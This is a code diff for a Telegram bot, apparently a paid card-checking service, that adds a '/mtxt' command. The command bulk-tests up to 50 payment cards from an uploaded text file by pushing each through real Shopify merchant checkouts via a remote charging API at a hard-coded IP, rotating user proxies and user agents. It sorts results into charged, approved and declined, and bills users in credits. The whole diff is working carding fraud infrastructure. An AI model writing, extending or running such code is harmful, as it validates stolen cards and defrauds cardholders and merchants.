@@ -594,6 +594,7 @@ async function setBotCommands(supabase?: any): Promise<void> {
     { command: "mystatus", description: "Check account status" },
     { command: "kill", description: "Kill a card (5 credits)" },
     { command: "sh", description: "Shopify Charge check" },
+    { command: "mtxt", description: "Bulk check from TXT file" },
     { command: "bin", description: "Lookup BIN details" },
   ];
 
@@ -6106,6 +6107,340 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
 
+      // ─────────────────────────────────────────────────────────
+      // TXT FILE SHOPIFY CHARGE (/mtxt) PRICE GROUP CALLBACK
+      // ─────────────────────────────────────────────────────────
+
+      if (callbackData === "mtxt_nosite") {
+        await answerCallbackQuery(update.callback_query.id, "❌ No sites available in this price range");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      if (callbackData.startsWith("mtxt_") && !callbackData.startsWith("mtxt_nosite")) {
+        const mtxtParts = callbackData.replace("mtxt_", "").split("_");
+        const mtxtPriceMin = parseInt(mtxtParts[0]);
+        const mtxtPriceMax = parseInt(mtxtParts[1]);
+        const mtxtBulkId = mtxtParts[2];
+
+        // Fetch cards from DB
+        const { data: mtxtBulkData } = await supabase.from("pending_bulk_checks").select("cards").eq("id", mtxtBulkId).maybeSingle();
+        let mtxtCards: string[] = [];
+        if (mtxtBulkData?.cards) { mtxtCards = mtxtBulkData.cards.split("\n").filter((c: string) => c.trim()); }
+        await supabase.from("pending_bulk_checks").delete().eq("id", mtxtBulkId);
+        if (!mtxtCards.length) {
+          await answerCallbackQuery(update.callback_query.id, "❌ Card data expired or invalid");
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        if (!callbackChatId || !messageId) {
+          await answerCallbackQuery(update.callback_query.id, "❌ Invalid request");
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        await answerCallbackQuery(update.callback_query.id, `⚡ Checking ${mtxtCards.length} cards on $${mtxtPriceMin}-$${mtxtPriceMax}...`);
+
+        const { data: mtxtProfile } = await supabase
+          .from("profiles")
+          .select("user_id, username, credits, is_banned")
+          .eq("telegram_chat_id", callbackChatId)
+          .maybeSingle();
+
+        if (!mtxtProfile) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>Account not found.</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+        if (mtxtProfile.is_banned) {
+          await editTelegramMessage(callbackChatId, messageId, `🚫 <b>Account Suspended</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+        if (mtxtProfile.credits < mtxtCards.length) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>${mtxtCards.length}</b> credits. Balance: <b>${mtxtProfile.credits}</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        // Fetch sites
+        let mtxtSitesQuery = supabase.from("gateway_urls").select("url, price").not("url", "like", "https://razorpay.me/%").lte("price", 100);
+        if (mtxtPriceMin > 0) mtxtSitesQuery = mtxtSitesQuery.gt("price", mtxtPriceMin);
+        if (mtxtPriceMax < 100) mtxtSitesQuery = mtxtSitesQuery.lte("price", mtxtPriceMax);
+        else mtxtSitesQuery = mtxtSitesQuery.gt("price", 0);
+        const { data: mtxtSites } = await mtxtSitesQuery.order("created_at", { ascending: false });
+
+        if (!mtxtSites || mtxtSites.length === 0) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>No sites available</b> in $${mtxtPriceMin}-$${mtxtPriceMax} range.`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        // Fetch proxies
+        const { data: mtxtProxies } = await supabase.from("user_proxies").select("*").eq("user_id", mtxtProfile.user_id);
+        if (!mtxtProxies || mtxtProxies.length < 1) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>No Proxies</b>\n\nAdd proxies at yunchicheck.com/dashboard → Proxies`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        const SHOPIFY_API_URL_MTXT = "http://108.165.12.183:8081/";
+        const MTXT_DEBUG_CHAT = "-1003848532661";
+        const MTXT_UNKNOWN_RETRIES = 3;
+        const mtxtStartTime = Date.now();
+
+        const mtxtBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
+        const mtxtProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset"];
+        const mtxtSiteDeadIndicators = ["site dead"];
+        const mtxtUserAgents = [
+          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
+          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
+        ];
+
+        const mtxtFormatProxy = (p: any) => p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
+        const mtxtFailedProxyIds: string[] = [];
+        const mtxtAvailableSites = [...mtxtSites].sort(() => Math.random() - 0.5);
+
+        // BIN lookup helper
+        const mtxtBinCache: Record<string, { bank: string; country: string; flag: string }> = {};
+        const mtxtLookupBin = async (cardNum: string) => {
+          const bin = cardNum.replace(/\D/g, '').slice(0, 6);
+          if (mtxtBinCache[bin]) return mtxtBinCache[bin];
+          let bank = "Unknown", country = "", countryCode = "XX";
+          const getF = (code: string) => { if (!code || code === 'XX') return '🌍'; return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)); };
+          try {
+            const r = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
+            if (r.ok) { const d = await r.json(); bank = d.bank?.name || "Unknown"; country = d.country?.name || ""; countryCode = d.country?.alpha2 || "XX"; }
+          } catch {}
+          if (bank === "Unknown") {
+            try {
+              const r2 = await fetch(`https://api.bincodes.com/bin/?format=json&api_key=free&bin=${bin}`);
+              if (r2.ok) { const d2 = await r2.json(); if (d2.bank && d2.bank !== 'N/A') bank = d2.bank; if (d2.countrycode && d2.countrycode !== 'N/A') countryCode = d2.countrycode; }
+            } catch {}
+          }
+          if (bank === "Unknown") {
+            try {
+              const r3 = await fetch(`${SUPABASE_URL}/functions/v1/bin-lookup`, { method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` }, body: JSON.stringify({ bin }) });
+              if (r3.ok) { const d3 = await r3.json(); if (d3.bank && d3.bank !== 'Unknown') bank = d3.bank; if (d3.countryCode && d3.countryCode !== 'XX') countryCode = d3.countryCode; }
+            } catch {}
+          }
+          const result = { bank, country, flag: getF(countryCode) };
+          mtxtBinCache[bin] = result;
+          return result;
+        };
+
+        // Single call helper
+        const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
+          const apiUrl = `${SHOPIFY_API_URL_MTXT}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 45000);
+          try {
+            const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mtxtUserAgents[Math.floor(Math.random() * mtxtUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
+            clearTimeout(timeout);
+            const rawText = await resp.text();
+            if (!rawText || rawText.trim() === '') return { status: 'unknown', message: 'Empty', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'Empty' };
+            const rawLower = rawText.toLowerCase();
+            if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token'))
+              return { status: 'unknown', message: 'Transient', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'Transient' };
+            if (mtxtProxyDeadIndicators.some(ind => rawLower.includes(ind)))
+              return { status: 'dead', message: 'Proxy Dead', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, response: 'Proxy Dead' };
+            if (mtxtSiteDeadIndicators.some(ind => rawLower.includes(ind)))
+              return { status: 'dead', message: 'Site Dead', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: true, response: 'Site Dead' };
+            if (mtxtBadResponses.some(bad => rawLower.includes(bad.toLowerCase())))
+              return { status: 'dead', message: 'Bad response', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
+            if (rawText.includes('DELIVERY_ADDRESS'))
+              return { status: 'dead', message: 'DELIVERY_ADDRESS', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'DELIVERY_ADDRESS' };
+
+            let price = 0, priceStr = '$0.00';
+            const pricePatterns = [/\$[\d,]+\.?\d*/g, /"price":\s*"?[\d.]+/gi, /"amount":\s*"?[\d.]+/gi];
+            for (const pattern of pricePatterns) { const matches = rawText.match(pattern); if (matches) { for (const m of matches) { const v = parseFloat(m.replace(/[^0-9.]/g, "")); if (!isNaN(v) && v > 0 && (v < price || price === 0)) { price = v; priceStr = `$${v.toFixed(2)}`; } } } }
+
+            let apiStatus = 'unknown', apiMessage = rawText, apiResponse = '';
+            try {
+              const json = JSON.parse(rawText);
+              if (json.Price > 0) { price = json.Price; priceStr = `$${Number(json.Price).toFixed(2)}`; }
+              if (json.Response) apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
+              apiMessage = json.message || json.msg || json.error || rawText;
+              if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎')
+                { apiStatus = 'live'; apiMessage = json.message || json.Response || 'Charged'; }
+              else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED')
+                { apiStatus = 'dead'; apiMessage = json.message || json.error || json.Response || 'Declined'; }
+              else {
+                const combined = ((apiMessage || '') + ' ' + (apiResponse || '')).toLowerCase();
+                if (combined.includes('order_completed') || combined.includes('charged') || combined.includes('success') || combined.includes('approved')) apiStatus = 'live';
+                else if (combined.includes('declined') || combined.includes('invalid') || combined.includes('expired') || combined.includes('insufficient') || combined.includes('card_declined') || combined.includes('do_not_honor') || combined.includes('fraud') || combined.includes('otp_required') || combined.includes('3ds') || combined.includes('rejected') || combined.includes('restricted') || combined.includes('generic_decline')) apiStatus = 'dead';
+              }
+            } catch {
+              const lower = rawText.toLowerCase();
+              if (lower.includes('order completed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) apiStatus = 'live';
+              else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('otp_required') || lower.includes('rejected')) apiStatus = 'dead';
+            }
+            return { status: apiStatus, message: apiMessage, price, priceStr, proxyDead: false, siteDead: false, response: apiResponse };
+          } catch (e) { clearTimeout(timeout); const msg = e instanceof Error ? e.message : 'Error'; return { status: 'unknown', message: msg.includes('abort') ? 'Timeout' : msg, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' }; }
+        };
+
+        // With retry
+        const mtxtCallWithRetry = async (cardCC: string, siteUrl: string, proxy: string) => {
+          let result = await mtxtCallOnce(cardCC, siteUrl, proxy);
+          if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
+          for (let retry = 1; retry <= MTXT_UNKNOWN_RETRIES; retry++) {
+            await new Promise(r => setTimeout(r, 800 * retry));
+            result = await mtxtCallOnce(cardCC, siteUrl, proxy);
+            if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
+          }
+          return result;
+        };
+
+        // Check a single card with site/proxy rotation
+        const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
+          const shuffledProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
+          if (shuffledProxies.length === 0) return { status: 'unknown', response: 'No proxies', price: '$0.00' };
+          const maxSites = Math.min(2, mtxtAvailableSites.length);
+          for (let si = 0; si < maxSites; si++) {
+            const site = mtxtAvailableSites[si % mtxtAvailableSites.length];
+            for (const proxy of shuffledProxies) {
+              if (mtxtFailedProxyIds.includes(proxy.id)) continue;
+              const result = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
+              if (result.proxyDead) {
+                mtxtFailedProxyIds.push(proxy.id);
+                supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
+                continue;
+              }
+              if (result.siteDead) {
+                supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
+                break;
+              }
+              if (result.status === 'live' || result.status === 'dead') {
+                return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
+              }
+              return { status: 'unknown', response: result.response || result.message || 'Unknown', price: result.price > 0 ? result.priceStr : '$0.00' };
+            }
+          }
+          return { status: 'unknown', response: 'All attempts failed', price: '$0.00' };
+        };
+
+        // Results array
+        interface MtxtResult { cc: string; status: string; response: string; price: string; bank: string; flag: string; }
+        const mtxtResults: MtxtResult[] = [];
+        let mtxtCharged = 0, mtxtApproved = 0, mtxtDeclined = 0;
+        let mtxtTotalCost = 0;
+
+        // Build live update message
+        const buildMtxtMessage = (checked: number, total: number, elapsed: string) => {
+          let msg = `📄 <b>𝗧𝗫𝗧 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b> | <b>${checked}/${total}</b> | <b>${elapsed}s</b>\n\n`;
+          const counters: string[] = [];
+          if (mtxtCharged > 0) counters.push(`💎 <b>${mtxtCharged} Charged</b>`);
+          if (mtxtApproved > 0) counters.push(`✅ <b>${mtxtApproved} Approved</b>`);
+          if (mtxtDeclined > 0) counters.push(`❌ <b>${mtxtDeclined} Declined</b>`);
+          if (counters.length > 0) msg += counters.join('   ') + '\n';
+
+          for (const r of mtxtResults) {
+            let emoji = '⚠️';
+            if (r.status === 'live') emoji = '💎';
+            else if (r.status === 'dead') emoji = '❌';
+            else emoji = '✅';
+
+            msg += `\n<code>${escapeHtml(r.cc)}</code>\n`;
+            msg += `${emoji} <b><i>${escapeHtml(r.response)}</i></b> | <b>${escapeHtml(r.price)}</b>\n`;
+            msg += `<i>${escapeHtml(r.bank)} ${r.flag}</i>\n`;
+          }
+
+          return msg;
+        };
+
+        // Auto-determine thread count
+        const mtxtActiveProxies = mtxtProxies.filter((p: any) => !mtxtFailedProxyIds.includes(p.id)).length;
+        const mtxtThreads = Math.max(3, Math.min(4, Math.min(mtxtActiveProxies, mtxtCards.length)));
+
+        // Show initial processing message
+        await editTelegramMessage(callbackChatId, messageId, `📄 <b>𝗧𝗫𝗧 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b> | <b>0/${mtxtCards.length}</b> | <b>0.00s</b>\n\n⏳ <i>Starting bulk check (${mtxtThreads} threads)...</i>`);
+
+        // Process card helper
+        let mtxtChecked = 0;
+        const mtxtProcessCard = async (cardCC: string) => {
+          const cardParts = cardCC.split("|");
+          if (cardParts.length < 4 || !cardParts[3] || cardParts[3].length < 3) {
+            mtxtResults.push({ cc: cardCC, status: 'error', response: 'Invalid format', price: '$0.00', bank: 'N/A', flag: '🌍' });
+            mtxtDeclined++;
+            mtxtChecked++;
+            return;
+          }
+
+          const [binInfo, result] = await Promise.all([
+            mtxtLookupBin(cardParts[0]),
+            mtxtCheckCard(cardCC)
+          ]);
+
+          let statusType: string;
+          const respLower = (result.response || '').toLowerCase();
+          if (result.status === 'live') {
+            if (respLower.includes('order_completed') || respLower.includes('order completed')) { mtxtCharged++; statusType = 'live'; }
+            else { mtxtApproved++; statusType = 'approved'; }
+          } else if (result.status === 'dead') {
+            mtxtDeclined++; statusType = 'dead';
+          } else {
+            if (respLower.includes('3ds') || respLower.includes('otp') || respLower.includes('required')) { mtxtApproved++; statusType = 'approved'; }
+            else { mtxtDeclined++; statusType = 'dead'; }
+          }
+
+          let cardCost = 0;
+          if (result.status === 'live') cardCost = 2;
+          else if (result.status === 'dead') cardCost = 1;
+          mtxtTotalCost += cardCost;
+
+          if (cardCost > 0) {
+            await supabase.from("profiles").update({ credits: mtxtProfile.credits - mtxtTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mtxtProfile.user_id);
+            await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
+          } else {
+            await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: "unknown" });
+          }
+
+          if (result.status === 'live' && SUPABASE_SERVICE_ROLE_KEY) {
+            fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+              method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
+              body: JSON.stringify({ user_id: mtxtProfile.user_id, card_details: cardCC, status: 'CHARGED', response_message: result.response, amount: result.price, gateway: 'Shopify Charge' }),
+            }).catch(() => {});
+          }
+
+          mtxtResults.push({
+            cc: cardCC,
+            status: statusType,
+            response: result.response || 'N/A',
+            price: result.price,
+            bank: binInfo.bank,
+            flag: binInfo.flag,
+          });
+
+          mtxtChecked++;
+
+          const elapsed = ((Date.now() - mtxtStartTime) / 1000).toFixed(2);
+          try {
+            await editTelegramMessage(callbackChatId, messageId, buildMtxtMessage(mtxtChecked, mtxtCards.length, elapsed));
+          } catch {}
+        };
+
+        // Process cards with auto threads
+        const mtxtQueue = mtxtCards.map(c => c.trim()).filter(c => c);
+        let mtxtQueueIdx = 0;
+        const mtxtWorker = async () => {
+          while (mtxtQueueIdx < mtxtQueue.length) {
+            const idx = mtxtQueueIdx++;
+            await mtxtProcessCard(mtxtQueue[idx]);
+          }
+        };
+        const mtxtWorkers: Promise<void>[] = [];
+        for (let t = 0; t < mtxtThreads; t++) { mtxtWorkers.push(mtxtWorker()); }
+        await Promise.all(mtxtWorkers);
+
+        // Final message
+        const mtxtElapsed = ((Date.now() - mtxtStartTime) / 1000).toFixed(2);
+        const { data: mtxtUpdatedProfile } = await supabase.from("profiles").select("credits").eq("user_id", mtxtProfile.user_id).single();
+        const mtxtNewBalance = mtxtUpdatedProfile?.credits ?? (mtxtProfile.credits - mtxtTotalCost);
+        let mtxtFinalMsg = buildMtxtMessage(mtxtCards.length, mtxtCards.length, mtxtElapsed);
+        mtxtFinalMsg += `\n✅ <b>Process Completed</b>\n`;
+        mtxtFinalMsg += `<i>💰 Cost: -${mtxtTotalCost} credits ・ Balance: ${mtxtNewBalance}</i>`;
+        if (mtxtFailedProxyIds.length > 0) mtxtFinalMsg += `\n🔴 <b>${mtxtFailedProxyIds.length} dead proxy removed</b>`;
+
+        await editTelegramMessage(callbackChatId, messageId, mtxtFinalMsg, {
+          inline_keyboard: [[{ text: "🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu_back" }]]
+        });
+
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
 
       if (callbackData === "user_mystatus") {
         const { data: profile } = await supabase
@@ -10253,6 +10588,142 @@ cc|mm|yy|cvv</code>
 `, { inline_keyboard: mshPriceButtons }, messageId);
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
+
+    // ─────────────────────────────────────────────────────────
+    // /mtxt - SHOPIFY CHARGE FROM TXT FILE (bulk check)
+    // ─────────────────────────────────────────────────────────
+
+    if (text === "/mtxt" || text.startsWith("/mtxt ") || text.startsWith("/mtxt\n")) {
+      // Check for attached document or reply-to document
+      const mtxtDoc = update.message?.document;
+      const mtxtReplyDoc = update.message?.reply_to_message?.document;
+      const targetDoc = mtxtDoc || mtxtReplyDoc;
+
+      if (!targetDoc) {
+        await sendTelegramMessage(chatId, `
+📄 <b>𝗧𝗫𝗧 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>
+
+📌 <b>Usage:</b>
+Send a <code>.txt</code> file with <code>/mtxt</code> as caption
+<i>or</i> reply to a <code>.txt</code> file with <code>/mtxt</code>
+
+📎 <b>File Format:</b>
+One card per line in the TXT file:
+<code>4111111111111111|12|25|123</code>
+<code>4111111111111111:12:25:123</code>
+<code>4111111111111111 12 25 123</code>
+
+📊 <b>Limits:</b> Up to <b>50 cards</b> per file
+
+┌─── 💲 <b>Pricing</b> ───┐
+│ 🟢 CHARGED ➜ 2 credits     │
+│ 🔴 DECLINED ➜ 1 credit      │
+│ ⚠️ UNKNOWN ➜ Free           │
+└────────────────────────┘
+`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Validate file type
+      if (!targetDoc.file_name?.endsWith(".txt") && targetDoc.mime_type !== "text/plain") {
+        await sendTelegramMessage(chatId, `❌ <b>Invalid File</b>\n\nOnly <code>.txt</code> files are supported.\nReceived: <code>${escapeHtml(targetDoc.file_name || 'unknown')}</code>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Download file from Telegram
+      let fileContent = "";
+      try {
+        const fileInfoRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${targetDoc.file_id}`);
+        const fileInfo = await fileInfoRes.json();
+        if (fileInfo.ok && fileInfo.result?.file_path) {
+          const fileRes = await fetch(`https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${fileInfo.result.file_path}`);
+          fileContent = await fileRes.text();
+        }
+      } catch (err) {
+        await sendTelegramMessage(chatId, "❌ <b>Failed to download file</b>", undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      if (!fileContent.trim()) {
+        await sendTelegramMessage(chatId, "❌ <b>Empty file.</b> No content found.", undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Parse cards from file
+      const mtxtValidCards = extractCardsFromText(fileContent);
+      if (mtxtValidCards.length === 0) {
+        await sendTelegramMessage(chatId, `❌ <b>No valid cards found in file.</b>\n\nSupported formats:\n<code>cc|mm|yy|cvv</code>\n<code>cc:mm:yy:cvv</code>\n<code>cc mm yy cvv</code>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+      if (mtxtValidCards.length > 50) {
+        await sendTelegramMessage(chatId, `❌ <b>Too many cards.</b>\n\nMax <b>50 cards</b> per file. Your file has ${mtxtValidCards.length}.`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Check user
+      const { data: mtxtUserProfile } = await supabase
+        .from("profiles")
+        .select("user_id, username, credits, is_banned")
+        .eq("telegram_chat_id", chatId)
+        .maybeSingle();
+
+      if (!mtxtUserProfile) {
+        await sendTelegramMessage(chatId, `❌ <b>Account Not Connected</b>\n\nLink your Telegram at yunchicheck.com\n<b>Chat ID:</b> <code>${chatId}</code>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+      if (mtxtUserProfile.is_banned) {
+        await sendTelegramMessage(chatId, `🚫 <b>Account Suspended</b>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+      if (mtxtUserProfile.credits < mtxtValidCards.length) {
+        await sendTelegramMessage(chatId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>${mtxtValidCards.length}</b> credits for ${mtxtValidCards.length} cards.\nBalance: <b>${mtxtUserProfile.credits}</b>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Store cards in DB
+      const mtxtBulkId = crypto.randomUUID().slice(0, 8);
+      await supabase.from("pending_bulk_checks").insert({ id: mtxtBulkId, cards: mtxtValidCards.join("\n"), chat_id: String(chatId), user_id: mtxtUserProfile.user_id });
+
+      // Fetch price group counts
+      const mtxtPriceGroups = [
+        { label: "$0 – $10", min: 0, max: 10, emoji: "💰" },
+        { label: "$10 – $20", min: 10, max: 20, emoji: "💎" },
+        { label: "$20 – $35", min: 20, max: 35, emoji: "🔥" },
+        { label: "$35 – $100", min: 35, max: 100, emoji: "⚡" },
+      ];
+
+      const mtxtGroupCounts = await Promise.all(
+        mtxtPriceGroups.map(async (g) => {
+          let query = supabase.from("gateway_urls").select("id", { count: "exact", head: true }).not("url", "like", "https://razorpay.me/%").lte("price", g.max === 100 ? 100 : g.max);
+          if (g.min > 0) query = query.gt("price", g.min);
+          else query = query.gt("price", 0);
+          const { count } = await query;
+          return { ...g, count: count || 0 };
+        })
+      );
+
+      const mtxtTotalSites = mtxtGroupCounts.reduce((a, g) => a + g.count, 0);
+
+      const mtxtPriceButtons: any[][] = [];
+      for (const g of mtxtGroupCounts) {
+        if (g.count > 0) {
+          mtxtPriceButtons.push([{ text: `${g.emoji} ${g.label}  •  ${g.count} sites`, callback_data: `mtxt_${g.min}_${g.max}_${mtxtBulkId}` }]);
+        } else {
+          mtxtPriceButtons.push([{ text: `${g.emoji} ${g.label}  •  0 sites ✖️`, callback_data: `mtxt_nosite` }]);
+        }
+      }
+      mtxtPriceButtons.push([{ text: `🎲 𝗔𝘂𝘁𝗼 – Any Range  •  ${mtxtTotalSites} sites`, callback_data: `mtxt_0_100_${mtxtBulkId}` }]);
+
+      await sendTelegramMessage(chatId, `
+📄 <b>𝗧𝗫𝗧 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>
+
+📊 <b>${mtxtValidCards.length} cards</b> extracted from <code>${escapeHtml(targetDoc.file_name || 'file.txt')}</code>
+💰 <b>Balance:</b> ${mtxtUserProfile.credits} credits
+🌐 <b>Sites:</b> ${mtxtTotalSites} available
+
+⬇️ <b>𝗦𝗲𝗹𝗲𝗰𝘁 𝗣𝗿𝗶𝗰𝗲 𝗥𝗮𝗻𝗴𝗲</b> ⬇️
+`, { inline_keyboard: mtxtPriceButtons }, messageId);
     }
 
     // ─────────────────────────────────────────────────────────
